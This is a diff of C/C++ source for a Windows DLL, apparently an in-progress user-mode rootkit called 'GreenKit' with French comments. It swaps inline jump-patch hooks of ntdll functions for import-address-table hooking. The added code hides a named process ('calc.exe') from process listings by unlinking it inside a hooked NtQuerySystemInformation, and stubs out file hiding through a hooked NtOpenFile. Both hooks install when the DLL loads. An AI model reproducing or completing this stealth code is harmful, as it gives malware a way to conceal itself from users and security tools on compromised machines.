@@ -8,89 +8,10 @@
 #include <string.h>
 #include <stdio.h>
 #include <winsock2.h>
-#include <fstream>
-#include <iostream>
 #include "ZwOpenFile.h"
-
-typedef LONG  NTSTATUS;
-
-typedef struct _UNICODE_STRING
-{
-    USHORT        Length;
-    USHORT        MaximumLength;
-    PWSTR        Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
-
-
-typedef struct _ANSI_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PCHAR Buffer;
-}ANSI_STRING, *PANSI_STRING;
-
-typedef struct _OBJECT_ATTRIBUTES
-{
-    ULONG        Length;
-    HANDLE        RootDirectory;
-    PUNICODE_STRING ObjectName;
-    ULONG        Attributes;
-    PVOID        SecurityDescriptor;
-    PVOID        SecurityQualityOfService;
-} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
-
-typedef struct _IO_STATUS_BLOCK {
-    union {
-        NTSTATUS Status;
-        PVOID Pointer;
-    } DUMMYUNIONNAME;
-
-    ULONG_PTR Information;
-} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
-
-typedef NTSTATUS(__stdcall *pNtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
-
-typedef NTSTATUS(__stdcall *pNtCreateKey)(
-    __out PHANDLE KeyHandle,
-    __in ACCESS_MASK DesiredAccess,
-    __in POBJECT_ATTRIBUTES ObjectAttributes,
-    __reserved ULONG TitleIndex,
-    __in_opt PUNICODE_STRING Class,
-    __in ULONG CreateOptions,
-    __out_opt PULONG Disposition);
-
-
-typedef NTSTATUS(__stdcall *_NtCreateFile)(
-    PHANDLE FileHandle,
-    ACCESS_MASK DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes,
-    PIO_STATUS_BLOCK IoStatusBlock,
-    PLARGE_INTEGER AllocationSize,
-    ULONG FileAttributes,
-    ULONG ShareAccess,
-    ULONG CreateDisposition,
-    ULONG CreateOptions,
-    PVOID EaBuffer,
-    ULONG EaLength
-    );
-
-typedef VOID(__stdcall *_RtlInitUnicodeString)(
-    PUNICODE_STRING DestinationString,
-    PCWSTR SourceString
-    );
-
-#define FILE_CREATE 0x00000002
-#define FILE_NON_DIRECTORY_FILE 0x00000040
-#define OBJ_CASE_INSENSITIVE 0x00000040L
-
-#define InitializeObjectAttributes( i, o, a, r, s ) {    \
-      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
-      (i)->RootDirectory = r;                            \
-      (i)->Attributes = a;                               \
-      (i)->ObjectName = o;                               \
-      (i)->SecurityDescriptor = s;                       \
-      (i)->SecurityQualityOfService = NULL;              \
-   }
-
+#include <string.h>
+#include <iostream>
+#include <winternl.h>
 
 BOOL mustHideFile(TCHAR filePath) {
     return FALSE; // TODO check la fin de la string avec des constantes
@@ -100,55 +21,15 @@ BOOL mustHideReg(TCHAR filePath) {
     return TRUE; // TODO check la fin de la string avec des constantes
 }
 
-typedef struct _CLIENT_ID {
-    HANDLE UniqueProcess;
-    HANDLE UniqueThread;
-} CLIENT_ID;
 
-typedef LONG KPRIORITY;
+/*  IAT   HOOKING  */
 
-typedef struct _SYSTEM_THREAD_INFORMATION {
-    LARGE_INTEGER KernelTime;
-    LARGE_INTEGER UserTime;
-    LARGE_INTEGER CreateTime;
-    ULONG WaitTime;
-    PVOID StartAddress;
-    CLIENT_ID ClientId;
-    KPRIORITY Priority;
-    LONG BasePriority;
-    ULONG ContextSwitches;
-    ULONG ThreadState;
-    ULONG WaitReason;
-} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;
+#pragma comment(lib, "ntdll")
+
+#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
 
 
-
-/*typedef struct _SYSTEM_PROCESS_INFORMATION
-{
-    DWORD          NextEntryDelta;
-    DWORD          dThreadCount;
-    DWORD          dReserved01;
-    DWORD          dReserved02;
-    DWORD          dReserved03;
-    DWORD          dReserved04;
-    DWORD          dReserved05;
-    DWORD          dReserved06;
-    FILETIME       ftCreateTime;	// relative to 01-01-1601 
-    FILETIME       ftUserTime;		// 100 nsec units 
-    FILETIME       ftKernelTime;	// 100 nsec units 
-    UNICODE_STRING ProcessName;
-    DWORD          BasePriority;
-    DWORD          dUniqueProcessId;
-    DWORD          dParentProcessID;
-    DWORD          dHandleCount;
-    DWORD          dReserved07;
-    DWORD          dReserved08;
-    DWORD          VmCounters;
-    DWORD          dCommitCharge;
-    SYSTEM_THREAD_INFORMATION  ThreadInfos[1];
-} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;*/
-
-typedef struct _SYSTEM_PROCESS_INFORMATION
+typedef struct _MY_SYSTEM_PROCESS_INFORMATION
 {
     ULONG                   NextEntryOffset;
     ULONG                   NumberOfThreads;
@@ -160,54 +41,22 @@ typedef struct _SYSTEM_PROCESS_INFORMATION
     ULONG                   BasePriority;
     HANDLE                  ProcessId;
     HANDLE                  InheritedFromProcessId;
-} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
+} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;
 
-typedef DWORD(CALLBACK* NQI)(DWORD, PVOID, ULONG, PULONG);
-NQI NtQuerySystemInformation;
-typedef DWORD(CALLBACK* NOF)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
-NOF NtOpenFile;
-char* PNametoProtect = "GreenKitExe.exe";
-BYTE hook[6];
-DWORD NtQuerySystemInformationAddr = 0;
-DWORD NtOpenFileAddr = 0;
+typedef NTSTATUS(WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
+    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    __inout    PVOID SystemInformation,
+    __in       ULONG SystemInformationLength,
+    __out_opt  PULONG ReturnLength
+    );
 
-extern "C" __declspec(dllexport) void InitGreenKit()
-{
-    MessageBox(0, "I'm initialized!", "Message from Greenkit!", 0);
-}
 
-DWORD HookFunction(LPCSTR lpModule, LPCSTR lpFuncName, LPVOID lpFunction, unsigned char *backup)
-{
-    BYTE jmp[6] = { 0xe9, //jmp
-        0x00, 0x00, 0x00, 0x00, //address
-        0xc3 //ret
-    };
-    DWORD dwAddr = (DWORD)GetProcAddress(GetModuleHandle(lpModule), lpFuncName);
-    ReadProcessMemory(GetCurrentProcess(), (LPVOID)dwAddr, backup, 6, 0);
-    DWORD dwCalc = ((DWORD)lpFunction - dwAddr - 5);
-    memcpy(&jmp[1], &dwCalc, 4);
-    WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwAddr, jmp, 6, 0);
-    return dwAddr;
-}
+//useless
+PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation =
+(PNT_QUERY_SYSTEM_INFORMATION)::GetProcAddress(::GetModuleHandle("ntdll"), "NtQuerySystemInformation");
 
-BOOL UnHookFunction(LPCSTR lpModule, LPCSTR lpFuncName,  unsigned char *backup)
-{
-    DWORD dwAddr = (DWORD)GetProcAddress(GetModuleHandle(lpModule), lpFuncName);
-    if (WriteProcessMemory(GetCurrentProcess(), (LPVOID)dwAddr, backup, 6, 0))
-        return TRUE;
-    return FALSE;
-}
 
-NTSTATUS NTAPI NewNtOpenFileRet2(
-    PHANDLE				phFile,
-    ACCESS_MASK			DesiredAccess,
-    POBJECT_ATTRIBUTES	ObjectAttributes,
-    PIO_STATUS_BLOCK	IoStatusBlock,
-    ULONG				ShareAccess,
-    ULONG				OpenOptions)
-{
-    return 2; //deuxieme fonction custom, return final
-}
+LPVOID original_function;
 
 NTSTATUS NTAPI NewNtOpenFile(
     PHANDLE				phFile,
@@ -219,163 +68,106 @@ NTSTATUS NTAPI NewNtOpenFile(
 {
     TCHAR sPath[MAX_PATH];
     DWORD dwRet;
-    //HookFunction("ntdll.dll", "NtOpenFile", NewNtOpenFileRet2, hook);
-    //UnHookFunction("ntdll.dll", "NtOpenFile", hook);
-    WriteProcessMemory(GetCurrentProcess(), (void*)NtOpenFileAddr, hook, 6, 0);
     //dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
-    //pNtOpenFile NtOpenFile = (pNtOpenFile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenFile");
-   // if (!mustHideFile(*sPath))
-    NtOpenFile(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions); //ici on appel du coup la fonction custom 2
-    //NtOpenFileAddr = HookFunction("ntdll.dll", "NtOpenFile", NewNtOpenFileRet2, hook);
+    MessageBox(0, "NTDLL HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
+    if (!mustHideFile(*sPath))
+        NtOpenFile(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
+
     return 3; // STATUS_NO_SUCH_FILE
 }
 
-
-int WINAPI nMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)
+NTSTATUS WINAPI HookedNtQuerySystemInformation(
+    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
+    __inout    PVOID                    SystemInformation,
+    __in       ULONG                    SystemInformationLength,
+    __out_opt  PULONG                   ReturnLength
+    )
 {
-    UnHookFunction("user32.dll", "MessageBoxA", hook);
-    int result = MessageBox(0, lpText, "hooked with our own function", MB_OK);
-    HookFunction("user32.dll", "MessageBoxA", nMessageBox, hook);
-    return result;
-}
+    /*NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
+        SystemInformation,
+        SystemInformationLength,
+        ReturnLength);*/
+    MessageBox(0, "NTDLL HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
+    NTSTATUS status = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
+    {
+        //
+        // Loop through the list of processes
+        //
 
-bool ResolveNQI() // resolve function
-{
-    HINSTANCE hDLL = LoadLibrary("ntdll.dll");
-    if (hDLL)
-    {
-        NtQuerySystemInformation = (NQI)GetProcAddress(hDLL, "NtQuerySystemInformation");
-        if (!NtQuerySystemInformation)
-        {
-            FreeLibrary(hDLL);
-            return false;
-        }
-        else
-        {
-            FreeLibrary(hDLL);
-            return true;
-        }
-    }
-    else
-    {
-        FreeLibrary(hDLL);
-        return false;
-    }
-}
+        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
+        PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
 
-bool ResolveNOF() // resolve function
-{
-    HINSTANCE hDLL = LoadLibrary("ntdll.dll");
-    if (hDLL)
-    {
-        NtOpenFile = (NOF)GetProcAddress(hDLL, "NtOpenFile");
-        if (!NtOpenFile)
+        do
         {
-            FreeLibrary(hDLL);
-            return false;
-        }
-        else
-        {
-            FreeLibrary(hDLL);
-            return true;
-        }
-    }
-    else
-    {
-        FreeLibrary(hDLL);
-        return false;
-    }
-}
+            pCurrent = pNext;
+            pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-DWORD WINAPI NtQuerySystemInformationHOOK(DWORD SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
-{
-    //unhook
-    //UnHookFunction("ntdll.dll", "NtQuerySystemInformation", hook);
-    WriteProcessMemory(GetCurrentProcess(), (void*)NtQuerySystemInformationAddr, hook, 6, 0);
-    PSYSTEM_PROCESS_INFORMATION pSpiCurrent, pSpiPrec;
-    char *pname = NULL;
-    DWORD rc = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
-    // Success? 
-    
-    /*if (rc == 0)
-    {
-        switch (SystemInformationClass)// querying for processes?
-        {
-        case 5:	//SystemProcessInformation
-            pSpiCurrent = pSpiPrec = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
-
-            while (1)
+            if (!wcsncmp(pNext->ImageName.Buffer, L"calc.exe", pNext->ImageName.Length))
             {
-                // allocate memory to save process name in AINSI 				 
-                pname = (char *)GlobalAlloc(GMEM_ZEROINIT, pSpiCurrent->ProcessName.Length + 2);
-                // Convert unicode string to ansi 
-                WideCharToMultiByte(CP_ACP, 0,
-                    pSpiCurrent->ProcessName.Buffer,
-                    pSpiCurrent->ProcessName.Length + 1,
-                    pname, pSpiCurrent->ProcessName.Length + 1,
-                    NULL, NULL);
-                // if process is hidden
-                if (!_stricmp((char*)pname, PNametoProtect))
+                if (0 == pNext->NextEntryOffset)
                 {
-                    if (pSpiCurrent->NextEntryDelta == 0)
-                    {
-                        pSpiPrec->NextEntryDelta = 0;
-                        break;
-                    }
-                    else
-                    {
-                        pSpiPrec->NextEntryDelta +=
-                            pSpiCurrent->NextEntryDelta; // add deltas
-
-                        pSpiCurrent =
-                            (PSYSTEM_PROCESS_INFORMATION)((PCHAR)
-                            pSpiCurrent +
-                            pSpiCurrent->NextEntryDelta);
-                    }
+                    pCurrent->NextEntryOffset = 0;
                 }
                 else
                 {
-                    if (pSpiCurrent->NextEntryDelta == 0) break;
-                    pSpiPrec = pSpiCurrent;
-                    // Walk the list 
-                    pSpiCurrent = (PSYSTEM_PROCESS_INFORMATION)
-                        ((PCHAR)pSpiCurrent +
-                        pSpiCurrent->NextEntryDelta);
+                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                 }
 
-                GlobalFree(pname);
+                pNext = pCurrent;
             }
-            break;
-        }
-    }*/
-    //NtQuerySystemInformationAddr = HookFunction("ntdll.dll", "NtQuerySystemInformation", NtQuerySystemInformationHOOK, hook);
-    return (rc);
+        } while (pCurrent->NextEntryOffset != 0);
+    }
+    return status;
 }
 
-INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved)
+//API Hook Engine
+void *hook_function(char *szDllName, char *szFunctionName, void *pNewFunction)
 {
-    DWORD procID = GetCurrentProcessId();
-    char buffer[64];
-    wsprintf(buffer, "Injected on process %d", procID);
-    int messageBoxTest = 2;
-    if (messageBoxTest == 1)
+#define MakePtr(cast, ptr, addValue)(cast)((DWORD)(ptr) + (DWORD)(addValue))
+    DWORD dwOldProtect, dwOldProtect2;
+    HMODULE hModule = GetModuleHandle(NULL);
+    PIMAGE_DOS_HEADER pDosHeader;
+    PIMAGE_NT_HEADERS pNTHeader;
+    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
+    PIMAGE_THUNK_DATA pThunk;
+    void *pOldFunction;
+    if (!(pOldFunction = GetProcAddress(GetModuleHandle(szDllName), szFunctionName))) return 0;
+    pDosHeader = (PIMAGE_DOS_HEADER)hModule;
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return (NULL);
+    pNTHeader = MakePtr(PIMAGE_NT_HEADERS, pDosHeader, pDosHeader->e_lfanew);
+    if (pNTHeader->Signature != IMAGE_NT_SIGNATURE || (pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, pDosHeader, pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)) == (PIMAGE_IMPORT_DESCRIPTOR)pNTHeader) return (NULL);
+    while (pImportDesc->Name)
     {
-        HookFunction("user32.dll", "MessageBoxA", nMessageBox, hook);
-        MessageBox(0, buffer, "This text will never appear.", 0);
-        UnHookFunction("user32.dll", "MessageBoxA", hook);
-        MessageBox(0, buffer, "I AM A FREE FUNCTIONNN", 0);
+        char *szModuleName = MakePtr(char *, pDosHeader, pImportDesc->Name);
+        if (!stricmp(szModuleName, szDllName)) break;
+        pImportDesc++;
     }
-    else if (messageBoxTest == 2)
+    if (pImportDesc->Name == NULL) return (NULL);
+    pThunk = MakePtr(PIMAGE_THUNK_DATA, pDosHeader, pImportDesc->FirstThunk);
+    while (pThunk->u1.Function)
     {
-        if (ResolveNQI())
-            NtQuerySystemInformationAddr = HookFunction("ntdll.dll", "NtQuerySystemInformation", NtQuerySystemInformationHOOK, hook);
-        //UnHookFunction("ntdll.dll", "NtQuerySystemInformation", hook);
+        if (pThunk->u1.Function == (DWORD)pOldFunction)
+        {
+            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtect);
+            pThunk->u1.Function = (DWORD)pNewFunction;
+            VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), dwOldProtect, &dwOldProtect2);
+            return (pOldFunction);
+        }
+        pThunk++;
     }
-    else if (messageBoxTest == 3)
+    return (NULL);
+}
+
+//DLL EntryPoint
+bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
+{
+    switch (dwReason)
     {
-        if (ResolveNOF())
-            NtOpenFileAddr = HookFunction("ntdll.dll", "NtOpenFile", NewNtOpenFile, hook);
-        //UnHookFunction("ntdll.dll", "NtOpenFile", hook);
+    case DLL_PROCESS_ATTACH:
+        hook_function("NTDLL.DLL", "NtQuerySystemInformation", HookedNtQuerySystemInformation);
+        hook_function("NTDLL.DLL", "NtOpenFile", NewNtOpenFile);
+        return TRUE;
     }
     return TRUE;
 }
